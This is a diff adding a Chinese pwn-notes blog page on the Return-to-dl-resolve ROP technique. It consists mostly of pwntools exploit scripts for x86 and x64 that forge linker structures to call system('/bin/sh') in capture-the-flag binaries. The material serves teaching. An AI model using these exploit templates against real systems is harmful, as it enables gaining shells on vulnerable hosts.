@@ -1,0 +1,362 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+    <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="HandheldFriendly" content="true">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Yuri,blog" />
+    <meta name="generator" content="Maverick 1.1" />
+    <meta name="template" content="Galileo" />
+    <link rel="alternate" type="application/rss+xml" title="YuriSec &raquo; RSS 2.0" href="/feed/index.xml" />
+    <link rel="alternate" type="application/atom+xml" title="YuriSec &raquo; ATOM 1.0" href="/feed/atom/index.xml" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/yuriufo/yuriufo.github.io@master/assets/galileo-1c8f2638f2.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/yuriufo/yuriufo.github.io@master/assets/ExSearch/ExSearch-182e5a8868.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/yuriufo/yuriufo.github.io@master/assets/katex.min.css">
+    <link href="https://fonts.googleapis.com/css?family=Fira+Code&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700&display=swap">
+    <script>
+        var ExSearchConfig = {
+            root: "",
+            api: "https://cdn.jsdelivr.net/gh/yuriufo/yuriufo.github.io@master/121a9fcae088cdd2073a0964a8b8200f.json"
+        }
+    </script>
+    
+<title>Return-to-dl-resolve笔记 - YuriSec</title>
+<meta name="author" content="yuri" />
+<meta name="description" content="高级rop技巧 Return-to-dl-resolve。" />
+<meta property="og:title" content="Return-to-dl-resolve笔记 - YuriSec" />
+<meta property="og:description" content="高级rop技巧 Return-to-dl-resolve。" />
+<meta property="og:site_name" content="YuriSec" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/archives/Return-to-dl-resolve/" />
+<meta property="og:image" content="" />
+<meta property="article:published_time" content="2019-07-17T15:26:00-00.00" />
+<meta name="twitter:title" content="Return-to-dl-resolve笔记 - YuriSec" />
+<meta name="twitter:description" content="高级rop技巧 Return-to-dl-resolve。" />
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:image" content="" />
+
+
+    
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="//cdn.jsdelivr.net" />
+
+    </head>
+    
+    <body>
+        
+        <div class="container">
+            <header id="ga-header">
+                <div first>
+                    <aside id="ga-brand">
+                        <h1 class="brand"><a class="no-style" href="/">YuriSec</a></h1>
+                        <p>A simple static blog.</p>
+                    </aside>
+                </div>
+                <div second id="ga-nav">
+                    <nav class="navs">
+                        <ul><li><a class="ga-highlight" href="/" target="_self">首页</a></li><span class="separator">·</span><li><a class="ga-highlight" href="/archives/" target="_self">归档</a></li><span class="separator">·</span><li><a class="ga-highlight" href="/about/" target="_self">关于</a></li><span class="separator">·</span><li><a href="#" target="_self" class="search-form-input ga-highlight">搜索</a></li></ul>
+                    </nav>
+                </div>
+            </header>
+            <div class="wrapper">
+                
+<main>    
+    <section class="ga-section ga-content">
+        <article class="yue">
+            <h1 class="ga-post_title">Return-to-dl-resolve笔记</h1>
+            <span class="ga-post_meta ga-mono">
+                <span>yuri</span>
+                <time>
+                    2019-07-17
+                </time>
+                
+                in <a no-style class="category" href="/category/pwn/">
+                    pwn
+                </a>
+                
+                
+            </span>
+            <div class="ga-content_body">
+                <h1>Return-to-dl-resolve</h1>
+<h2><code>x86</code></h2>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./bin&#39;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">dl_resolve_data</span><span class="p">(</span><span class="n">base_stage</span><span class="p">,</span> <span class="n">fun_name</span><span class="p">):</span>
+    <span class="c1"># base_stage : dl_resolve_data_addr</span>
+    <span class="c1"># fun_name : str</span>
+    <span class="c1"># 40 &lt; len(return) &lt;= 50</span>
+    <span class="n">strtab</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">dynamic_value_by_tag</span><span class="p">(</span><span class="s1">&#39;DT_STRTAB&#39;</span><span class="p">)</span> <span class="c1"># &quot;.dynstr&quot;</span>
+    <span class="n">symtab</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">dynamic_value_by_tag</span><span class="p">(</span><span class="s1">&#39;DT_SYMTAB&#39;</span><span class="p">)</span> <span class="c1"># &quot;.dynsym&quot;</span>
+    <span class="n">syment</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">dynamic_value_by_tag</span><span class="p">(</span><span class="s1">&#39;DT_SYMENT&#39;</span><span class="p">)</span> <span class="c1"># 0x10</span>
+
+    <span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mh">0x8</span>
+    <span class="n">align</span> <span class="o">=</span> <span class="n">syment</span> <span class="o">-</span> <span class="p">((</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">symtab</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)</span>
+    <span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="n">align</span>   <span class="c1"># fake_sym_addr</span>
+    <span class="n">index_dynsym</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">symtab</span><span class="p">)</span> <span class="o">/</span> <span class="n">syment</span>
+
+    <span class="n">st_name</span> <span class="o">=</span> <span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">40</span><span class="p">)</span> <span class="o">-</span> <span class="n">strtab</span> <span class="c1"># fun_name.addr - strtab</span>
+
+    <span class="n">payload</span>  <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">((</span><span class="n">index_dynsym</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="n">align</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">st_name</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x12</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">40</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">fun_name</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span>
+
+    <span class="k">return</span> <span class="n">payload</span>
+
+<span class="k">def</span> <span class="nf">dl_resolve_call</span><span class="p">(</span><span class="n">data_addr</span><span class="p">,</span> <span class="n">args_addr</span><span class="p">):</span>
+    <span class="c1"># data_addr : dl_resolve_data_addr</span>
+    <span class="c1"># args_addr : args_addr</span>
+    <span class="c1"># len(return) == 0x10</span>
+    <span class="n">jmprel</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">dynamic_value_by_tag</span><span class="p">(</span><span class="s1">&#39;DT_JMPREL&#39;</span><span class="p">)</span>
+
+    <span class="n">reloc_offset</span> <span class="o">=</span> <span class="n">data_addr</span> <span class="o">-</span> <span class="n">jmprel</span>
+
+    <span class="n">buf</span>  <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s2">&quot;.plt&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="p">[</span><span class="s1">&#39;sh_addr&#39;</span><span class="p">])</span> <span class="c1"># plt_0</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">reloc_offset</span><span class="p">)</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="s1">&#39;AAAA&#39;</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">args_addr</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">buf</span>
+</pre></div>
+<p>其中：</p>
+<ul>
+<li><code>dl_resolve_data()</code>：伪造的数据，<code>fun_name</code>为调用的函数名(&quot;system&quot;)</li>
+<li><code>dl_resolve_call()</code>：伪造调用栈，<code>args_addr</code>为函数参数地址(addr(“/bin/sh\x00”))</li>
+<li><code>dl_resolve_data()</code>的<code>base_stage</code>与<code>dl_resolve_call()</code>的<code>data_addr</code>应一致，为<code>dl_resolve_data()</code>写入数据的起始地址</li>
+</ul>
+<p>例子：</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">offset</span> <span class="o">=</span> <span class="mi">112</span>
+    <span class="n">read_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+
+    <span class="n">ppp_ret</span> <span class="o">=</span> <span class="mh">0x08048619</span> <span class="c1"># ROPgadget --binary bof --only &quot;pop|ret&quot;</span>
+
+    <span class="n">base_stage</span> <span class="o">=</span> <span class="mh">0x0804a040</span> <span class="c1"># readelf -S bof | grep &quot;.bss&quot;</span>
+
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+    <span class="n">resolve_data_addr</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mh">0x10</span>
+    <span class="n">func_name</span> <span class="o">=</span> <span class="s2">&quot;system&quot;</span>
+    <span class="n">Args</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh&quot;</span>
+    <span class="n">args_addr</span> <span class="o">=</span> <span class="n">base_stage</span>
+
+    <span class="n">payload</span>  <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">read_plt</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ppp_ret</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">dl_resolve_call</span><span class="p">(</span><span class="n">resolve_data_addr</span><span class="p">,</span> <span class="n">args_addr</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">payload2</span> <span class="o">=</span> <span class="n">Args</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">payload2</span> <span class="o">+=</span> <span class="n">dl_resolve_data</span><span class="p">(</span><span class="n">resolve_data_addr</span><span class="p">,</span> <span class="n">func_name</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+<h2><code>x64</code></h2>
+<p>大部分基本一致，只是参数要通过<code>pop_rdi</code>传递：</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./bin&#39;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">Align</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">origin</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
+    <span class="n">padlen</span> <span class="o">=</span> <span class="n">size</span> <span class="o">-</span> <span class="p">((</span><span class="n">addr</span><span class="o">-</span><span class="n">origin</span><span class="p">)</span> <span class="o">%</span> <span class="n">size</span><span class="p">)</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">addr</span><span class="o">+</span><span class="n">padlen</span><span class="p">,</span> <span class="n">padlen</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">dl_resolve_data</span><span class="p">(</span><span class="n">base_stage</span><span class="p">,</span> <span class="n">fun_name</span><span class="p">):</span>
+    <span class="c1"># base_stage : dl_resolve_data_addr</span>
+    <span class="c1"># fun_name : str</span>
+
+    <span class="n">strtab</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">dynamic_value_by_tag</span><span class="p">(</span><span class="s1">&#39;DT_STRTAB&#39;</span><span class="p">)</span> <span class="c1"># &quot;.dynstr&quot;</span>
+    <span class="n">symtab</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">dynamic_value_by_tag</span><span class="p">(</span><span class="s1">&#39;DT_SYMTAB&#39;</span><span class="p">)</span> <span class="c1"># &quot;.dynsym&quot;</span>
+    <span class="n">syment</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">dynamic_value_by_tag</span><span class="p">(</span><span class="s1">&#39;DT_SYMENT&#39;</span><span class="p">)</span>
+    <span class="n">relaent</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">dynamic_value_by_tag</span><span class="p">(</span><span class="s1">&#39;DT_RELAENT&#39;</span><span class="p">)</span>
+    <span class="n">jmprel</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">dynamic_value_by_tag</span><span class="p">(</span><span class="s1">&#39;DT_JMPREL&#39;</span><span class="p">)</span>
+
+    <span class="n">addr_reloc</span><span class="p">,</span> <span class="n">padlen_reloc</span> <span class="o">=</span> <span class="n">Align</span><span class="p">(</span><span class="n">base_stage</span><span class="p">,</span> <span class="n">jmprel</span><span class="p">,</span> <span class="n">relaent</span><span class="p">)</span>
+    <span class="n">addr_sym</span><span class="p">,</span> <span class="n">padlen_sym</span> <span class="o">=</span> <span class="n">Align</span><span class="p">(</span><span class="n">addr_reloc</span><span class="o">+</span><span class="n">relaent</span><span class="p">,</span> <span class="n">symtab</span><span class="p">,</span> <span class="n">syment</span><span class="p">)</span>
+
+    <span class="n">addr_symstr</span> <span class="o">=</span> <span class="n">addr_sym</span> <span class="o">+</span> <span class="n">syment</span>
+
+    <span class="n">r_info</span> <span class="o">=</span> <span class="p">(((</span><span class="n">addr_sym</span> <span class="o">-</span> <span class="n">symtab</span><span class="p">)</span> <span class="o">/</span> <span class="n">syment</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span>
+    <span class="n">st_name</span> <span class="o">=</span> <span class="n">addr_symstr</span> <span class="o">-</span> <span class="n">strtab</span>
+
+    <span class="n">payload</span>  <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">padlen_reloc</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">r_info</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="n">padlen_sym</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">st_name</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">fun_name</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span>
+
+    <span class="k">return</span> <span class="n">payload</span>
+
+<span class="k">def</span> <span class="nf">dl_resolve_call</span><span class="p">(</span><span class="n">data_addr</span><span class="p">):</span>
+    <span class="c1"># data_addr : dl_resolve_data_addr</span>
+    <span class="c1"># len(return) == 0x10</span>
+    <span class="n">jmprel</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">dynamic_value_by_tag</span><span class="p">(</span><span class="s1">&#39;DT_JMPREL&#39;</span><span class="p">)</span>
+    <span class="n">relaent</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">dynamic_value_by_tag</span><span class="p">(</span><span class="s1">&#39;DT_RELAENT&#39;</span><span class="p">)</span>
+
+    <span class="n">addr_reloc</span><span class="p">,</span> <span class="n">padlen_reloc</span> <span class="o">=</span> <span class="n">Align</span><span class="p">(</span><span class="n">data_addr</span><span class="p">,</span> <span class="n">jmprel</span><span class="p">,</span> <span class="n">relaent</span><span class="p">)</span>
+    <span class="n">reloc_offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">addr_reloc</span> <span class="o">-</span> <span class="n">jmprel</span><span class="p">)</span> <span class="o">/</span> <span class="n">relaent</span>
+
+    <span class="n">buf</span>  <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s2">&quot;.plt&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="p">[</span><span class="s1">&#39;sh_addr&#39;</span><span class="p">])</span> <span class="c1"># plt_0</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">reloc_offset</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">buf</span>
+</pre></div>
+<p>但是<code>link_map+0x1c8</code>要置<code>0</code>，例子如下：</p>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">call64</span><span class="p">(</span><span class="n">call_got</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="n">arg2</span><span class="p">,</span><span class="n">arg3</span><span class="p">,</span><span class="n">ret</span><span class="p">):</span>
+    <span class="n">payload</span>  <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40064A</span><span class="p">)</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">call_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">arg3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">arg2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">arg1</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400630</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s2">&quot;a&quot;</span><span class="o">*</span><span class="mi">56</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">payload</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="mi">8</span>
+    <span class="n">read_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+    <span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+    <span class="n">read_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+    <span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+
+    <span class="n">base_stage</span> <span class="o">=</span> <span class="mh">0x601040</span> <span class="o">+</span> <span class="mh">0x400</span> <span class="c1"># readelf -S bof | grep &quot;.bss&quot;</span>
+    <span class="n">got_0</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">dynamic_value_by_tag</span><span class="p">(</span><span class="s1">&#39;DT_PLTGOT&#39;</span><span class="p">)</span>
+    <span class="n">vuln_addr</span> <span class="o">=</span> <span class="mh">0x40059F</span>
+    <span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x400653</span>
+    <span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x04006ab</span>
+
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;flag</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+    <span class="n">payload</span>  <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">call64</span><span class="p">(</span><span class="n">write_got</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">got_0</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span> <span class="n">vuln_addr</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">addr_dt_debug</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">+</span> <span class="mh">0x1c8</span>
+    <span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr_dt_debug</span><span class="p">)</span>
+
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+
+    <span class="n">payload</span>  <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">call64</span><span class="p">(</span><span class="n">read_got</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">addr_dt_debug</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span> <span class="n">vuln_addr</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+
+    <span class="n">resolve_data_addr</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mh">0x10</span>
+    <span class="n">func_name</span> <span class="o">=</span> <span class="s2">&quot;system&quot;</span>
+    <span class="n">Args</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh&quot;</span>
+
+    <span class="n">payload</span>  <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">call64</span><span class="p">(</span><span class="n">read_got</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">base_stage</span><span class="p">,</span><span class="mi">256</span><span class="p">,</span> <span class="n">vuln_addr</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">payload</span>  <span class="o">=</span> <span class="n">Args</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">dl_resolve_data</span><span class="p">(</span><span class="n">resolve_data_addr</span><span class="p">,</span> <span class="n">func_name</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">payload</span>  <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">dl_resolve_call</span><span class="p">(</span><span class="n">resolve_data_addr</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+            </div>
+        </article>
+        <div id="ga-tags">
+    
+    <span class="ga-tag">
+        <a class="ga-highlight" href="/tag/pwn/">#pwn</a>
+    </span>
+    
+    <span class="ga-tag">
+        <a class="ga-highlight" href="/tag/ROP/">#ROP</a>
+    </span>
+    
+</div>
+    </section>
+
+    
+<section id="ga-content_pager">
+
+    <div class="next">
+        <a class="ga-highlight" href="/archives/Radare2Note/">Radare2笔记</a>
+        <p class="yue">Radare2笔记（不断更新）。</p>
+    </div>
+
+
+    <div class="prev">
+        <a class="ga-highlight" href="/archives/CanaryNote/">canary笔记</a>
+        <p class="yue">canary(栈溢出保护)是一种缓冲区溢出攻击缓解手段。</p>
+    </div>
+
+</section>
+
+
+    
+
+</main>
+
+                <footer class="ga-mono" id="ga-footer">
+                    <section>
+                        <span id="ga-uptime"></span>
+                        <span class="brand">YuriSec</span>
+                    </section>
+                    <section>
+                        <p class="copyright">
+                            <span>Copyright © 2020 Yuri</span>
+                            <span>Powered by <a no-style href="https://github.com/AlanDecode/Maverick" target="_blank">Maverick & Galileo</a></span>
+                        </p>
+                        <div class="copyright">
+                            <span class="footer-addon">
+                                
+<a href="http://www.beian.miit.gov.cn/" rel="noopener" target="_blank">京ICP备20016612号</a>
+
+                            </span>
+                            <nav class="social-links">
+                                <ul><li><a class="no-style" title="GitHub" href="https://github.com/yuriufo" target="_blank"><i class="gi gi-github"></i>GitHub</a></li><span class="separator">·</span><li><a class="no-style" title="Weibo" href="https://weibo.com/qq771739864" target="_blank"><i class="gi gi-weibo"></i>Weibo</a></li></ul>
+                            </nav>
+                        </div>
+                    </section>
+                    <script>
+                        var site_build_date = "2018-03-28T00:00+08:00"
+                    </script>
+                    <script src="https://cdn.jsdelivr.net/gh/yuriufo/yuriufo.github.io@master/assets/galileo-dc4baa7cf4.js"></script>
+                </footer>
+            </div>
+        </div>
+    </div>
+
+    <!--katex-->
+    <script defer src="https://cdn.jsdelivr.net/gh/yuriufo/yuriufo.github.io@master/assets/katex.min.js"></script>
+    <script>
+    mathOpts = {
+        delimiters: [
+            {left: "$$", right: "$$", display: true},
+            {left: "\\[", right: "\\]", display: true},
+            {left: "$", right: "$", display: false},
+            {left: "\\(", right: "\\)", display: false}
+        ]
+    };
+    </script>
+    <script defer src="https://cdn.jsdelivr.net/gh/yuriufo/yuriufo.github.io@master/assets/auto-render.min.js" onload="renderMathInElement(document.body, mathOpts);"></script>
+
+    <script src="https://cdn.jsdelivr.net/gh/yuriufo/yuriufo.github.io@master/assets/ExSearch/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/yuriufo/yuriufo.github.io@master/assets/ExSearch/ExSearch-493cb9cd89.js"></script>
+
+    
+    </body>
+</html>
